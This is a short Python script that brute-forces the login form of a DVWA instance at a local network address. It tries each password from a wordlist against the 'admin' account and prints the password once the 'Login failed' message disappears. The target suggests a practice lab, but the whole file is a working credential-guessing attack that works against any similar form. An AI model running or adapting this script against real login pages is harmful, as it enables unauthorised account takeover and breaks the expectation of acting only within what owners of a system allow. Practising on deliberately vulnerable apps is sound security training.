import requests

target_url = "http://192.168.1.5/dvwa/login.php"
data_dictionnary = {"username":"admin", "password":"", "Login":"submit"}

with open("./passwords.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dictionnary["password"] = word
        response = requests.post(target_url, data=data_dictionnary)
        if "Login failed" not in response.content.decode():
            print("Passowrd is --> " + word)
            exit()

print("[+] Program is done")